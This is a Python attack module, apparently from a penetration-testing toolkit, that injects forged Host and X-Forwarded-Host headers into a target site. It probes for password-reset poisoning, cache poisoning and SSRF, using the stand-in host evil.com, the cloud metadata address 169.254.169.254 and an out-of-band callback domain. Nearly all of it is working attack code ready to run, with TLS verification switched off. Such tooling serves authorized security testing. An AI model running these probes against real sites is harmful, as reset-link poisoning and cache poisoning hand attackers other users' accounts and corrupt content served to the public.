#!/usr/bin/env python3
"""
host_header.py — Host Header Injection Attacks

Tests for:
1. Password reset poisoning (change Host → steal reset link)
2. Cache poisoning via Host header
3. Web cache deception via X-Forwarded-Host
4. SSRF via Host header
5. Open redirect via Host

Usage:
    from host_header import HostHeaderAttack
    attacker = HostHeaderAttack("https://target.com")
    results = attacker.test_all()
"""
import json
import os
import time
from pathlib import Path
from urllib.parse import urlparse

try:
    import requests
except ImportError:
    requests = None


class HostHeaderAttack:
    """Host header injection attack suite."""

    def __init__(self, base_url: str = ""):
        self.base_url = base_url.rstrip("/")
        self.domain = urlparse(base_url).hostname or ""
        self.findings = []
        self.session = requests.Session() if requests else None
        if self.session:
            self.session.verify = False
            import urllib3
            urllib3.disable_warnings()

    def test_password_reset_poisoning(self, reset_url: str = "",
                                      email: str = "",
                                      headers: dict = None) -> dict:
        """Test if password reset uses Host header for link generation."""
        headers = headers or {}
        result = {"type": "PASSWORD_RESET_POISONING", "vulnerable": False,
                  "tests": []}

        if not reset_url:
            # Find reset endpoint
            reset_paths = [
                "/forgot-password", "/password/reset",
                "/auth/forgot", "/api/auth/forgot-password",
                "/users/password/new", "/account/forgot",
            ]
            for path in reset_paths:
                url = f"{self.base_url}{path}"
                try:
                    resp = self.session.get(url, headers=headers, timeout=5)
                    if resp.status_code == 200:
                        reset_url = url
                        break
                except Exception:
                    continue

        if not reset_url:
            result["note"] = "No password reset endpoint found"
            return result

        test_email = email or f"test@{self.domain}"

        # Test 1: Host header override
        evil_host = "evil.com"
        host_headers = [
            {"Host": evil_host},
            {"X-Forwarded-Host": evil_host},
            {"X-Host": evil_host},
            {"X-Original-URL": f"https://{evil_host}/"},
            {"Forwarded": f"host={evil_host}"},
        ]

        for inject_headers in host_headers:
            header_name = list(inject_headers.keys())[0]
            try:
                merged = {**headers, **inject_headers}
                # Try POST (most reset forms are POST)
                resp = self.session.post(
                    reset_url,
                    data={"email": test_email},
                    headers=merged, timeout=8,
                    allow_redirects=False)

                test = {
                    "header": header_name,
                    "status": resp.status_code,
                    "reflected": evil_host in resp.text,
                    "in_location": evil_host in resp.headers.get("Location", ""),
                }

                if test["reflected"] or test["in_location"]:
                    test["vulnerable"] = True
                    result["vulnerable"] = True
                    result["severity"] = "HIGH"

                result["tests"].append(test)

            except Exception:
                continue
            time.sleep(0.3)

        if result["vulnerable"]:
            self.findings.append(result)

        return result

    def test_cache_poisoning(self, headers: dict = None) -> dict:
        """Test if Host header poisons the cache."""
        headers = headers or {}
        result = {"type": "CACHE_POISONING_HOST", "vulnerable": False,
                  "tests": []}

        # Inject Host header and check if response is cached
        evil_host = "evil.com"
        test_headers_list = [
            {"X-Forwarded-Host": evil_host},
            {"X-Host": evil_host},
            {"X-Forwarded-Server": evil_host},
        ]

        for inject in test_headers_list:
            header_name = list(inject.keys())[0]
            try:
                # Request with evil host header
                merged = {**headers, **inject}
                resp1 = self.session.get(self.base_url, headers=merged,
                                        timeout=8)

                # Check if evil host reflected in response
                if evil_host in resp1.text:
                    # Now request without the header — if still reflected, cache is poisoned
                    time.sleep(1)
                    resp2 = self.session.get(self.base_url, headers=headers,
                                           timeout=8)

                    test = {
                        "header": header_name,
                        "reflected_with_header": True,
                        "reflected_without_header": evil_host in resp2.text,
                    }

                    if test["reflected_without_header"]:
                        test["cache_poisoned"] = True
                        result["vulnerable"] = True
                        result["severity"] = "CRITICAL"

                    result["tests"].append(test)

            except Exception:
                continue
            time.sleep(0.5)

        if result["vulnerable"]:
            self.findings.append(result)

        return result

    def test_ssrf_via_host(self, headers: dict = None) -> dict:
        """Test if Host header triggers SSRF."""
        headers = headers or {}
        result = {"type": "SSRF_VIA_HOST", "vulnerable": False, "tests": []}

        callback = os.environ.get("INTERACTSH_URL", "burpcollaborator.net")
        internal_hosts = [
            "127.0.0.1", "localhost", "0.0.0.0",
            "169.254.169.254",   # AWS metadata
            "[::1]",             # IPv6 loopback
            f"evil.{callback}",  # OOB callback
        ]

        for host in internal_hosts:
            try:
                resp = self.session.get(
                    self.base_url,
                    headers={**headers, "Host": host},
                    timeout=8, allow_redirects=False)

                test = {
                    "host": host,
                    "status": resp.status_code,
                    "length": len(resp.text),
                }

                # Check for metadata response
                if "ami-id" in resp.text or "iam" in resp.text.lower():
                    test["cloud_metadata"] = True
                    result["vulnerable"] = True
                    result["severity"] = "CRITICAL"

                # Different response than normal = interesting
                result["tests"].append(test)

            except Exception:
                continue
            time.sleep(0.3)

        if result["vulnerable"]:
            self.findings.append(result)

        return result

    def test_all(self, headers: dict = None) -> dict:
        """Run all host header attacks."""
        headers = headers or {}
        return {
            "password_reset": self.test_password_reset_poisoning(
                headers=headers),
            "cache_poisoning": self.test_cache_poisoning(headers),
            "ssrf": self.test_ssrf_via_host(headers),
            "total_findings": len(self.findings),
        }

    def save_findings(self, target: str) -> None:
        out_dir = Path(f"findings/{target}/host_header")
        out_dir.mkdir(parents=True, exist_ok=True)
        if self.findings:
            out_file = out_dir / f"host_header_{int(time.time())}.json"
            out_file.write_text(json.dumps(self.findings, indent=2, default=str))
